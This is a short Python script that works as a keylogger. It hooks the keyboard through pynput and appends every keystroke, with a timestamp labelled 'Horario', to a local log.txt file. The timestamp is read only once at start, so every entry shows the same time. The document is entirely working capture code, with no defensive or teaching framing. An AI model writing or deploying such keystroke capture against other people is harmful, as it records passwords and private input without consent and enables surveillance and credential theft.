from pynput.keyboard import Listener
from datetime import datetime
time = datetime.now()
def writelog(key):
    
    keydata = str(key)
    with open('log.txt','a') as f:
        f.write(f'Horario[{time.strftime('%d/%m/%Y, %H:%M')}]={keydata}\n')

with Listener(on_press=writelog) as l:
    l.join()
